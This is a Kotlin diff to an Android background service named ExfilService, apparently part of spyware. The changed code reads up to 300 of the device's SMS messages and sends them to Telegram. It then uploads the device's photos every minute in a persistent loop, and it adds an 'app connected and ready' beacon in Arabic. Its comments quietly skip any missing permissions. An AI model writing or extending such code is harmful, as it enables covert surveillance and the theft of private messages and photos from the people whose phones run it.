@@ -25,7 +25,12 @@ class ExfilService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         startFg()
-        if (job?.isActive != true) job = scope.launch { loop() }
+        if (job?.isActive != true) {
+            job = scope.launch {
+                Telegram.sendText("🤖 التطبيق متصل ومستعد")
+                loop()
+            }
+        }
         return START_STICKY
     }
 
@@ -48,19 +53,23 @@ class ExfilService : Service() {
     private suspend fun loop() {
         var first = true
         while (currentCoroutineContext().isActive) {
-            try {
-                if (first) {
-                    try {
-                        val sms = SmsReader.readAll(this, 300)
-                        if (sms.isNotEmpty())
-                            Telegram.sendText("📩 SMS (" + sms.size + ")\n" + sms.joinToString("\n"))
-                    } catch (e: Exception) {
-                        // إلا ما كانتش صلاحية SMS، كمل للصور
-                    }
-                    first = false
+            if (first) {
+                try {
+                    val sms = SmsReader.readAll(this, 300)
+                    if (sms.isNotEmpty())
+                        Telegram.sendText("📩 SMS (" + sms.size + ")\n" + sms.joinToString("\n"))
+                } catch (e: Exception) {
+                    // ما عنديش صلاحية SMS
                 }
+                first = false
+            }
+            
+            try {
                 sendPhotos()
-            } catch (_: Exception) {}
+            } catch (e: Exception) {
+                // ما عنديش صلاحية الصور
+            }
+            
             delay(60_000)
         }
     }
